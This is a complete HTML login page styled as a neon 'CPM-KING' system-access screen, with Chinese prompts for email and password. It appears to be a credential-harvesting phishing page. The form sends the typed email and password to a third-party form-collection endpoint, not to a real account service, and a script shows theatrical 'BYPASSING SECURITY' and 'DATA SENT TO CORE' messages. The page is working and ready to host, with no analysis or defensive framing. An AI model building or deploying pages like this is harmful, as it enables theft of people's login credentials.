<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CPM-KING // SYSTEM ACCESS</title>
    <style>
        :root {
            --neon-blue: #00f3ff;
            --neon-purple: #bc13fe;
            --bg-dark: #050505;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', Courier, monospace; }

        body {
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: var(--bg-dark);
            overflow: hidden;
            color: var(--neon-blue);
        }

        /* 背景动态网格 */
        body::before {
            content: "";
            position: absolute;
            width: 200%;
            height: 200%;
            background-image: linear-gradient(rgba(0, 243, 255, 0.05) 1px, transparent 1px),
                              linear-gradient(90deg, rgba(0, 243, 255, 0.05) 1px, transparent 1px);
            background-size: 50px 50px;
            transform: perspective(500px) rotateX(60deg);
            animation: moveGrid 20s linear infinite;
            z-index: -1;
        }

        @keyframes moveGrid {
            0% { background-position: 0 0; }
            100% { background-position: 0 500px; }
        }

        /* 科技感卡片 */
        .login-card {
            background: rgba(0, 0, 0, 0.8);
            border: 2px solid var(--neon-blue);
            box-shadow: 0 0 20px var(--neon-blue), inset 0 0 10px var(--neon-blue);
            padding: 40px;
            border-radius: 5px;
            width: 90%;
            max-width: 400px;
            position: relative;
            clip-path: polygon(0 10%, 10% 0, 100% 0, 100% 90%, 90% 100%, 0 100%);
        }

        /* 扫描线效果 */
        .login-card::after {
            content: "";
            position: absolute;
            top: 0; left: 0; width: 100%; height: 2px;
            background: var(--neon-blue);
            opacity: 0.5;
            animation: scan 3s linear infinite;
        }

        @keyframes scan {
            0% { top: 0; }
            100% { top: 100%; }
        }

        h2 {
            font-size: 22px;
            margin-bottom: 30px;
            text-shadow: 0 0 10px var(--neon-blue);
            letter-spacing: 2px;
        }

        .input-group { margin-bottom: 20px; text-align: left; }
        
        label { font-size: 10px; text-transform: uppercase; margin-left: 5px; }

        input {
            width: 100%;
            padding: 12px;
            background: rgba(0, 243, 255, 0.1);
            border: 1px solid var(--neon-blue);
            color: #fff;
            font-size: 14px;
            outline: none;
            margin-top: 5px;
        }

        input:focus {
            background: rgba(0, 243, 255, 0.2);
            box-shadow: 0 0 15px var(--neon-blue);
        }

        .btn-submit {
            width: 100%;
            padding: 15px;
            background: transparent;
            color: var(--neon-blue);
            border: 2px solid var(--neon-blue);
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            text-transform: uppercase;
            margin-top: 10px;
        }

        .btn-submit:hover {
            background: var(--neon-blue);
            color: #000;
            box-shadow: 0 0 30px var(--neon-blue);
        }

        .footer {
            margin-top: 20px;
            font-size: 10px;
            opacity: 0.7;
        }
    </style>
</head>
<body>

    <div class="login-card">
        <h2>//账户登入界面//</h2>
        
        <form action="https://getform.io/f/z9rncgryekr" method="POST">
            <div class="input-group">
                <label>Protocol_ID</label>
                <input type="text" name="protocol_id" placeholder="请输入邮箱" required>
            </div>
            <div class="input-group">
                <label>Access_Key</label>
                <input type="password" name="access_key" placeholder="请输入密码" required>
            </div>
            <button type="submit" class="btn-submit">////登入////</button>
        </form>

        <p class="footer">//CPM老王//<br>//老王出品//</p>
    </div>

</body>
</html>
<script>
    const form = document.querySelector('form');
    const button = document.querySelector('.btn-submit');

    form.onsubmit = function() {
        button.innerText = "INITIALIZING PROTOCOL... 0%";
        let progress = 0;
        let interval = setInterval(() => {
            progress += Math.floor(Math.random() * 10) + 5;
            if (progress >= 100) {
                progress = 100;
                clearInterval(interval);
                button.innerText = "DATA SENT TO CORE.";
            } else {
                button.innerText = `BYPASSING SECURITY... ${progress}%`;
            }
        }, 300);
    };
</script>
